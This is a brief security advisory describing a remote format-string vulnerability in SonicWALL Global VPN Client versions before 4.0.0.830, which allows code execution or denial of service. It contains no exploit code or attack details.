SonicWALL Global VPN Client is prone to a remote format-string vulnerability because it fails to properly sanitize user-supplied input before passing it as the format specifier to a formatted-printing function.

Successfully exploiting this issue allows remote attackers to execute arbitrary machine code in the context of the application. Failed attempts may cause denial-of-service conditions.

Versions prior to SonicWALL Global VPN Client 4.0.0.830 are affected.
